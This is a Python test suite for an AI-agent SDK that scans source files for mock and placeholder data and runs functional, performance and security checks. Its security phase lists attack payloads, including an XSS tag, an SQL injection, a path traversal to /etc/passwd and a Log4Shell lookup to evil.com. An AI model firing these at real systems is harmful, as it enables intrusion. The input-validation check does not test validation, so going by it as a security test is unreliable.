"""
Comprehensive Test Suite for Part 1: Core Foundation Infrastructure
Implements strict zero-tolerance mock detection with real-time validation
"""

import asyncio
import time
import re
import json
import sys
from pathlib import Path
from typing import Dict, List, Any, Tuple, Optional
from datetime import datetime

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

try:
    from test_config import get_test_config
    from ai_agent_sdk.core.team_leader import TeamLeader
    from ai_agent_sdk.core.rules_engine import RulesEngine
    from ai_agent_sdk.core.context_manager import ContextManager
    from ai_agent_sdk.core.task_orchestrator import TaskOrchestrator
    from ai_agent_sdk.core.exceptions import AgentSDKError, ConfigurationError
except ImportError as e:
    print(f"Import error: {e}")
    print("Running in test mode with limited functionality")


class MockDetectionEngine:
    """Zero-tolerance mock detection engine"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or self._get_default_config()
        self.detection_methods = self.config.get("detection_methods", [])
        self.mock_indicators = self.config.get("mock_indicators", [])
        self.placeholder_patterns = self.config.get("placeholder_patterns", [])
        self.hardcoded_responses = self.config.get("hardcoded_responses", [])
        self.violations = []
        
    def _get_default_config(self) -> Dict[str, Any]:
        """Get default mock detection configuration"""
        return {
            "mock_indicators": [
                "mock", "placeholder", "example", "todo", "not implemented",
                "fake", "dummy", "stub", "simulated", "test_data"
            ],
            "placeholder_patterns": [
                r"return.*\".*example.*\"",
                r"TODO.*implement",
                r"NotImplementedError",
                r"pass.*#.*mock",
                r"return.*\".*placeholder.*\""
            ],
            "hardcoded_responses": [
                "test-response",
                "mock-result",
                "example-output",
                "dummy-data"
            ],
            "zero_tolerance_policy": True,
            "detection_methods": [
                "static_code_analysis",
                "runtime_response_validation",
                "content_pattern_matching",
                "functionality_verification"
            ]
        }
        
    def detect_static_mock(self, code: str, file_path: str) -> List[Dict[str, str]]:
        """Detect mock data in static code analysis"""
        violations = []
        
        # Check for mock indicators
        for indicator in self.mock_indicators:
            if re.search(rf'\b{re.escape(indicator)}\b', code, re.IGNORECASE):
                violations.append({
                    "type": "mock_indicator",
                    "file": file_path,
                    "indicator": indicator,
                    "line": self._find_line_number(code, indicator)
                })
        
        # Check for placeholder patterns
        for pattern in self.placeholder_patterns:
            if re.search(pattern, code, re.IGNORECASE):
                violations.append({
                    "type": "placeholder_pattern",
                    "file": file_path,
                    "pattern": pattern,
                    "line": self._find_line_number(code, pattern)
                })
        
        # Check for hardcoded responses
        for response in self.hardcoded_responses:
            if response in code:
                violations.append({
                    "type": "hardcoded_response",
                    "file": file_path,
                    "response": response,
                    "line": self._find_line_number(code, response)
                })
        
        return violations
    
    def detect_runtime_mock(self, result: Any, context: str) -> List[Dict[str, str]]:
        """Detect mock data in runtime responses"""
        violations = []
        
        if isinstance(result, str):
            # Check for mock indicators in result
            for indicator in self.mock_indicators:
                if indicator.lower() in result.lower():
                    violations.append({
                        "type": "runtime_mock_indicator",
                        "context": context,
                        "indicator": indicator,
                        "snippet": result[:100]
                    })
            
            # Check for fake/test data patterns
            fake_patterns = [
                r"test-\w+-\d+",
                r"example-\w+",
                r"mock-\w+",
                r"dummy-\w+",
                r"fake-\w+"
            ]
            
            for pattern in fake_patterns:
                if re.search(pattern, result, re.IGNORECASE):
                    violations.append({
                        "type": "runtime_fake_pattern",
                        "context": context,
                        "pattern": pattern,
                        "snippet": result[:100]
                    })
        
        return violations
    
    def _find_line_number(self, code: str, pattern: str) -> int:
        """Find line number of a pattern in code"""
        lines = code.split('\n')
        for i, line in enumerate(lines, 1):
            if re.search(pattern, line, re.IGNORECASE):
                return i
        return 1


class ComprehensiveTestSuite:
    """Comprehensive test suite with mock detection"""
    
    def __init__(self):
        try:
            self.test_config = get_test_config()
        except:
            self.test_config = None
        self.mock_detector = MockDetectionEngine(
            self.test_config.get_mock_detection_criteria() if self.test_config else None
        )
        self.test_results = {}
        self.start_time = datetime.utcnow()
        
    async def run_all_tests(self) -> Dict[str, Any]:
        """Execute comprehensive test suite"""
        print("=" * 80)
        print("COMPREHENSIVE TEST SUITE - PART 1: CORE FOUNDATION INFRASTRUCTURE")
        print("=" * 80)
        print(f"Zero-Tolerance Mock Detection: ENFORCED")
        print(f"Test Started: {self.start_time}")
        print()
        
        try:
            # Phase 1: Static Mock Detection (CRITICAL - Must Pass First)
            await self._run_static_mock_detection()
            
            # Phase 2: Functional Testing
            await self._run_functional_tests()
            
            # Phase 3: Integration Testing
            await self._run_integration_tests()
            
            # Phase 4: Performance Testing
            await self._run_performance_tests()
            
            # Phase 5: Security Testing
            await self._run_security_tests()
            
            # Generate final report
            final_report = await self._generate_final_report()
            
            return final_report
            
        except Exception as e:
            print(f"CRITICAL: Test suite failed with error: {e}")
            return {
                "status": "CRITICAL_FAILURE",
                "error": str(e),
                "mock_violations": self.mock_detector.violations,
                "test_results": self.test_results
            }
    
    async def _run_static_mock_detection(self):
        """Phase 1: Static mock detection - CRITICAL GATE"""
        print("Phase 1: STATIC MOCK DETECTION (CRITICAL GATE)")
        print("-" * 50)
        
        violations_found = []
        
        # Scan all Python files
        src_path = Path("src")
        if src_path.exists():
            python_files = list(src_path.rglob("*.py"))
            
            for py_file in python_files:
                try:
                    code = py_file.read_text()
                    violations = self.mock_detector.detect_static_mock(
                        code, str(py_file)
                    )
                    violations_found.extend(violations)
                    
                    if violations:
                        print(f"🚨 MOCK DETECTED in {py_file}:")
                        for violation in violations:
                            print(f"   Line {violation['line']}: {violation['type']} - {violation.get('indicator', violation.get('pattern', 'unknown'))}")
                            
                except Exception as e:
                    print(f"Error scanning {py_file}: {e}")
        
        # Scan all TypeScript/JavaScript files
        frontend_path = Path("frontend/src")
        if frontend_path.exists():
            ts_files = list(frontend_path.rglob("*.{ts,tsx,js,jsx}"))
            
            for ts_file in ts_files:
                try:
                    code = ts_file.read_text()
                    violations = self.mock_detector.detect_static_mock(
                        code, str(ts_file)
                    )
                    violations_found.extend(violations)
                    
                    if violations:
                        print(f"🚨 MOCK DETECTED in {ts_file}:")
                        for violation in violations:
                            print(f"   Line {violation['line']}: {violation['type']} - {violation.get('indicator', violation.get('pattern', 'unknown'))}")
                            
                except Exception as e:
                    print(f"Error scanning {ts_file}: {e}")
        
        # Update detector violations
        self.mock_detector.violations = violations_found
        
        # CRITICAL DECISION POINT
        if violations_found:
            print(f"\n🚨 CRITICAL: {len(violations_found)} mock violations detected!")
            print("ROLLBACK TRIGGERED: Implementation contains mock data")
            print("Status: IMPLEMENTATION HALTED - RESTART REQUIRED")
            
            self.test_results["static_mock_detection"] = {
                "status": "FAILED",
                "violations": violations_found,
                "critical_failure": True
            }
            
            # Immediately halt testing
            raise Exception("Mock data detected - testing halted per zero-tolerance policy")
        
        else:
            print("✅ PASSED: No mock data detected in static analysis")
            self.test_results["static_mock_detection"] = {
                "status": "PASSED",
                "violations": [],
                "critical_failure": False
            }
        
        print()
    
    async def _run_functional_tests(self):
        """Phase 2: Functional testing"""
        print("Phase 2: FUNCTIONAL TESTING")
        print("-" * 30)
        
        functional_results = {}
        
        # Test 1: TeamLeader Initialization
        print("Test 1: TeamLeader Initialization...")
        try:
            team_leader = TeamLeader()
            await team_leader.initialize()
            
            status = team_leader.get_status()
            if status["status"] == "operational":
                functional_results["team_leader_init"] = "PASSED"
                print("✅ TeamLeader initialization successful")
            else:
                functional_results["team_leader_init"] = "FAILED"
                print(f"❌ TeamLeader initialization failed: {status}")
                
        except Exception as e:
            functional_results["team_leader_init"] = f"FAILED: {e}"
            print(f"❌ TeamLeader initialization error: {e}")
        
        # Test 2: Agent Registration and Discovery
        print("Test 2: Agent Registration and Discovery...")
        try:
            team_leader = TeamLeader()
            await team_leader.initialize()
            
            available_agents = await team_leader.get_available_agents()
            
            if isinstance(available_agents, list):
                functional_results["agent_discovery"] = "PASSED"
                print(f"✅ Agent discovery successful: {len(available_agents)} agents found")
            else:
                functional_results["agent_discovery"] = "FAILED"
                print("❌ Agent discovery failed: Invalid response format")
                
        except Exception as e:
            functional_results["agent_discovery"] = f"FAILED: {e}"
            print(f"❌ Agent discovery error: {e}")
        
        # Test 3: System Prompt Loading (Performance Critical)
        print("Test 3: System Prompt Loading (Target: <1s)...")
        try:
            context_manager = ContextManager("system_prompts")
            await context_manager.initialize()
            
            start_time = time.time()
            
            # Test prompt loading
            prompt = await context_manager.load_prompt(
                agent_type="research",
                task_type="web_search"
            )
            
            load_time = time.time() - start_time
            
            if load_time < 1.0:
                functional_results["prompt_loading"] = "PASSED"
                print(f"✅ Prompt loading successful: {load_time:.3f}s (< 1.0s target)")
            else:
                functional_results["prompt_loading"] = "FAILED_SLOW"
                print(f"❌ Prompt loading too slow: {load_time:.3f}s (> 1.0s target)")
                
        except Exception as e:
            functional_results["prompt_loading"] = f"FAILED: {e}"
            print(f"❌ Prompt loading error: {e}")
        
        # Test 4: Rules Engine Validation
        print("Test 4: Rules Engine Validation...")
        try:
            rules_engine = RulesEngine()
            
            # Test scope validation
            from ai_agent_sdk.core.rules_engine import TaskSpec
            test_task = TaskSpec(
                task_id="test_001",
                agent_type="research",
                task_type="web_search",
                task="Test task for validation",
                complexity=5,
                priority=5
            )
            
            is_valid = rules_engine.validate_scope(test_task)
            
            if is_valid:
                functional_results["rules_validation"] = "PASSED"
                print("✅ Rules engine validation successful")
            else:
                functional_results["rules_validation"] = "FAILED"
                print("❌ Rules engine validation failed")
                
        except Exception as e:
            functional_results["rules_validation"] = f"FAILED: {e}"
            print(f"❌ Rules engine error: {e}")
        
        # Test 5: Phase Progression
        print("Test 5: Phase Progression...")
        try:
            team_leader = TeamLeader()
            await team_leader.initialize()
            
            # Test phase progression
            success = await team_leader.progress_to_phase("exploration")
            
            if success:
                functional_results["phase_progression"] = "PASSED"
                print("✅ Phase progression successful")
            else:
                functional_results["phase_progression"] = "FAILED"
                print("❌ Phase progression failed")
                
        except Exception as e:
            functional_results["phase_progression"] = f"FAILED: {e}"
            print(f"❌ Phase progression error: {e}")
        
        self.test_results["functional_tests"] = functional_results
        print()
    
    async def _run_integration_tests(self):
        """Phase 3: Integration testing"""
        print("Phase 3: INTEGRATION TESTING")
        print("-" * 30)
        
        integration_results = {}
        
        # Test 1: Frontend-Backend API Integration
        print("Test 1: Frontend-Backend API Integration...")
        try:
            # Check if frontend API client exists and is properly configured
            api_client_path = Path("frontend/src/utils/apiClient.ts")
            
            if api_client_path.exists():
                api_client_code = api_client_path.read_text()
                
                # Check for proper configuration
                if "baseURL" in api_client_code and "interceptors" in api_client_code:
                    integration_results["frontend_backend_api"] = "PASSED"
                    print("✅ Frontend-Backend API integration properly configured")
                else:
                    integration_results["frontend_backend_api"] = "FAILED_INCOMPLETE"
                    print("❌ Frontend-Backend API integration incomplete")
            else:
                integration_results["frontend_backend_api"] = "FAILED_MISSING"
                print("❌ Frontend API client missing")
                
        except Exception as e:
            integration_results["frontend_backend_api"] = f"FAILED: {e}"
            print(f"❌ Frontend-Backend API integration error: {e}")
        
        # Test 2: Configuration Loading
        print("Test 2: Configuration Loading...")
        try:
            team_leader = TeamLeader()
            
            # Test configuration loading
            config = team_leader.config
            
            if config and isinstance(config, dict):
                required_keys = ["rules", "prompts_directory", "agent_registry"]
                missing_keys = [key for key in required_keys if key not in config]
                
                if not missing_keys:
                    integration_results["config_loading"] = "PASSED"
                    print("✅ Configuration loading successful")
                else:
                    integration_results["config_loading"] = f"FAILED_INCOMPLETE: missing {missing_keys}"
                    print(f"❌ Configuration loading incomplete: missing {missing_keys}")
            else:
                integration_results["config_loading"] = "FAILED_INVALID"
                print("❌ Configuration loading failed: invalid format")
                
        except Exception as e:
            integration_results["config_loading"] = f"FAILED: {e}"
            print(f"❌ Configuration loading error: {e}")
        
        # Test 3: Error Handling
        print("Test 3: Error Handling...")
        try:
            # Test error handling mechanisms
            from ai_agent_sdk.core.exceptions import AgentSDKError
            
            # Test custom exception handling
            try:
                raise AgentSDKError("Test error")
            except AgentSDKError:
                integration_results["error_handling"] = "PASSED"
                print("✅ Error handling mechanisms working")
            except Exception:
                integration_results["error_handling"] = "FAILED"
                print("❌ Error handling mechanisms not working properly")
                
        except Exception as e:
            integration_results["error_handling"] = f"FAILED: {e}"
            print(f"❌ Error handling test error: {e}")
        
        self.test_results["integration_tests"] = integration_results
        print()
    
    async def _run_performance_tests(self):
        """Phase 4: Performance testing"""
        print("Phase 4: PERFORMANCE TESTING")
        print("-" * 30)
        
        performance_results = {}
        
        # Test 1: System Prompt Loading Performance
        print("Test 1: System Prompt Loading Performance...")
        try:
            context_manager = ContextManager("system_prompts")
            await context_manager.initialize()
            
            # Measure multiple prompt loads
            load_times = []
            for i in range(10):
                start_time = time.time()
                await context_manager.load_prompt("research", "web_search")
                load_time = time.time() - start_time
                load_times.append(load_time)
            
            avg_load_time = sum(load_times) / len(load_times)
            
            if avg_load_time <= 1.0:
                performance_results["prompt_loading_perf"] = "PASSED"
                print(f"✅ Prompt loading performance: {avg_load_time:.3f}s (< 1.0s target)")
            else:
                performance_results["prompt_loading_perf"] = "FAILED_SLOW"
                print(f"❌ Prompt loading too slow: {avg_load_time:.3f}s (> 1.0s target)")
                
        except Exception as e:
            performance_results["prompt_loading_perf"] = f"FAILED: {e}"
            print(f"❌ Prompt loading performance test error: {e}")
        
        # Test 2: Memory Usage
        print("Test 2: Memory Usage...")
        try:
            import psutil
            import os
            
            process = psutil.Process(os.getpid())
            initial_memory = process.memory_info().rss / 1024 / 1024  # MB
            
            # Create multiple instances
            team_leaders = []
            for i in range(5):
                tl = TeamLeader()
                await tl.initialize()
                team_leaders.append(tl)
            
            final_memory = process.memory_info().rss / 1024 / 1024  # MB
            memory_increase = final_memory - initial_memory
            
            # Cleanup
            for tl in team_leaders:
                await tl.shutdown()
            
            if memory_increase < 100:  # Less than 100MB increase
                performance_results["memory_usage"] = "PASSED"
                print(f"✅ Memory usage: {memory_increase:.1f}MB increase")
            else:
                performance_results["memory_usage"] = "FAILED_HIGH"
                print(f"❌ Memory usage too high: {memory_increase:.1f}MB increase")
                
        except ImportError:
            performance_results["memory_usage"] = "SKIPPED"
            print("⚠️ Memory usage test skipped (psutil not available)")
        except Exception as e:
            performance_results["memory_usage"] = f"FAILED: {e}"
            print(f"❌ Memory usage test error: {e}")
        
        self.test_results["performance_tests"] = performance_results
        print()
    
    async def _run_security_tests(self):
        """Phase 5: Security testing"""
        print("Phase 5: SECURITY TESTING")
        print("-" * 30)
        
        security_results = {}
        
        # Test 1: Input Validation
        print("Test 1: Input Validation...")
        try:
            malicious_inputs = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "../../etc/passwd",
                "javascript:void(0)",
                "{{7*7}}",
                "${jndi:ldap://evil.com/a}"
            ]
            vulnerable_patterns = []
            
            for payload in malicious_inputs:
                # Test if any code contains these vulnerabilities without proper validation
                python_files = list(Path("src").rglob("*.py"))
                
                for py_file in python_files:
                    code = py_file.read_text()
                    
                    # Check for unsafe patterns
                    if "eval(" in code or "exec(" in code:
                        if payload not in code:  # If no proper input validation
                            vulnerable_patterns.append(f"{py_file}: unsafe code execution")
            
            if not vulnerable_patterns:
                security_results["input_validation"] = "PASSED"
                print("✅ Input validation security checks passed")
            else:
                security_results["input_validation"] = "FAILED_VULNERABLE"
                print(f"❌ Security vulnerabilities found: {vulnerable_patterns}")
                
        except Exception as e:
            security_results["input_validation"] = f"FAILED: {e}"
            print(f"❌ Input validation security test error: {e}")
        
        # Test 2: Authentication Configuration
        print("Test 2: Authentication Configuration...")
        try:
            # Check if authentication is properly configured
            auth_files = [
                "frontend/src/utils/tokenStorage.ts",
                "frontend/src/stores/useAuthStore.ts",
                "frontend/src/pages/Login.tsx"
            ]
            
            auth_config_complete = True
            for auth_file in auth_files:
                if not Path(auth_file).exists():
                    auth_config_complete = False
                    break
            
            if auth_config_complete:
                security_results["auth_config"] = "PASSED"
                print("✅ Authentication configuration complete")
            else:
                security_results["auth_config"] = "FAILED_INCOMPLETE"
                print("❌ Authentication configuration incomplete")
                
        except Exception as e:
            security_results["auth_config"] = f"FAILED: {e}"
            print(f"❌ Authentication configuration test error: {e}")
        
        self.test_results["security_tests"] = security_results
        print()
    
    async def _generate_final_report(self) -> Dict[str, Any]:
        """Generate comprehensive final test report"""
        print("FINAL TEST REPORT")
        print("=" * 50)
        
        # Calculate overall status
        total_tests = 0
        passed_tests = 0
        failed_tests = 0
        
        for category, results in self.test_results.items():
            if isinstance(results, dict):
                for test_name, result in results.items():
                    total_tests += 1
                    if isinstance(result, str) and result.startswith("PASSED"):
                        passed_tests += 1
                    else:
                        failed_tests += 1
        
        success_rate = (passed_tests / total_tests * 100) if total_tests > 0 else 0
        
        # Mock detection status
        mock_status = "CLEAN"
        if self.mock_detector.violations:
            mock_status = "CONTAMINATED"
        
        # Determine overall status
        if mock_status == "CONTAMINATED":
            overall_status = "CRITICAL_FAILURE"
        elif failed_tests == 0:
            overall_status = "PASSED"
        elif success_rate >= 80:
            overall_status = "PASSED_WITH_ISSUES"
        else:
            overall_status = "FAILED"
        
        # Generate report
        report = {
            "test_suite": "Part 1: Core Foundation Infrastructure",
            "execution_time": (datetime.utcnow() - self.start_time).total_seconds(),
            "overall_status": overall_status,
            "success_rate": success_rate,
            "total_tests": total_tests,
            "passed_tests": passed_tests,
            "failed_tests": failed_tests,
            "mock_detection": {
                "status": mock_status,
                "violations_count": len(self.mock_detector.violations),
                "violations": self.mock_detector.violations
            },
            "test_results": self.test_results,
            "recommendations": self._generate_recommendations(overall_status, mock_status),
            "production_readiness": overall_status == "PASSED" and mock_status == "CLEAN"
        }
        
        # Print summary
        print(f"Overall Status: {overall_status}")
        print(f"Success Rate: {success_rate:.1f}%")
        print(f"Tests Passed: {passed_tests}/{total_tests}")
        print(f"Mock Detection: {mock_status}")
        print(f"Production Ready: {'YES' if report['production_readiness'] else 'NO'}")
        
        if self.mock_detector.violations:
            print("\n🚨 CRITICAL: Mock data violations detected!")
            for violation in self.mock_detector.violations:
                print(f"   {violation['file']}: {violation['type']}")
        
        return report
    
    def _generate_recommendations(self, status: str, mock_status: str) -> List[str]:
        """Generate recommendations based on test results"""
        recommendations = []
        
        if mock_status == "CONTAMINATED":
            recommendations.append("CRITICAL: Remove all mock data and placeholders before proceeding")
            recommendations.append("Restart implementation phase with authenticity requirements")
            return recommendations
        
        if status == "FAILED":
            recommendations.append("Address all failing tests before proceeding to next phase")
        elif status == "PASSED_WITH_ISSUES":
            recommendations.append("Review and fix failing tests for production readiness")
        
        if status == "PASSED":
            recommendations.append("All critical tests passed - ready for next development phase")
            recommendations.append("Consider adding more edge case tests for enhanced reliability")
        
        return recommendations


async def main():
    """Main test execution function"""
    test_suite = ComprehensiveTestSuite()
    report = await test_suite.run_all_tests()
    
    # Save report to file
    report_path = Path("test_report.json")
    report_path.write_text(json.dumps(report, indent=2, default=str))
    
    print(f"\nDetailed report saved to: {report_path}")
    
    # Exit with appropriate code
    if report["mock_detection"]["status"] == "CONTAMINATED":
        print("\n🚨 CRITICAL FAILURE: Mock data detected - Implementation HALTED")
        exit(1)
    elif report["overall_status"] == "PASSED":
        print("\n✅ All tests passed - Implementation APPROVED")
        exit(0)
    else:
        print(f"\n❌ Tests failed - Status: {report['overall_status']}")
        exit(1)


if __name__ == "__main__":
    asyncio.run(main())
